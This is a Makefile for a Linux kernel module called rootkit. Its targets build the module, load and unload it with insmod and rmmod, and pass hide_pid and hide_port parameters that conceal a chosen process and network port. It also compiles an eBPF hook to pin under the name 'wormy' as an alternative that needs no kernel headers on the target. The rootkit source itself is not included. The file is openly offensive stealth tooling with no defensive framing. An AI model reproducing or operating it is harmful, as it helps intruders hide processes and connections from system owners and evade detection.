obj-m += rootkit.o

KDIR    := /lib/modules/$(shell uname -r)/build
PWD     := $(shell pwd)
CC      := gcc
EXTRA_CFLAGS := -O2 -Wall

all:
	$(MAKE) -C $(KDIR) M=$(PWD) modules

clean:
	$(MAKE) -C $(KDIR) M=$(PWD) clean

install:
	@echo "[*] Loading rootkit module..."
	insmod rootkit.ko $(ARGS)
	@echo "[+] Module loaded. Check dmesg."

uninstall:
	@echo "[*] Removing rootkit module..."
	rmmod rootkit
	@echo "[+] Module removed."

hide_pid:
	@echo "[*] Hiding PID=$(PID)..."
	insmod rootkit.ko hide_pid=$(PID)

hide_port:
	@echo "[*] Hiding PORT=$(PORT)..."
	insmod rootkit.ko hide_port=$(PORT)

status:
	@lsmod | grep rootkit || echo "Module not loaded"
	@dmesg | tail -20

# eBPF alternative (no LKM, no kernel headers needed on target)
ebpf:
	clang -O2 -target bpf -c ebpf_hook.c -o ebpf_hook.o
	@echo "[+] eBPF object compiled: ebpf_hook.o"
	@echo "    Load with: bpftool prog load ebpf_hook.o /sys/fs/bpf/wormy"

.PHONY: all clean install uninstall hide_pid hide_port status ebpf
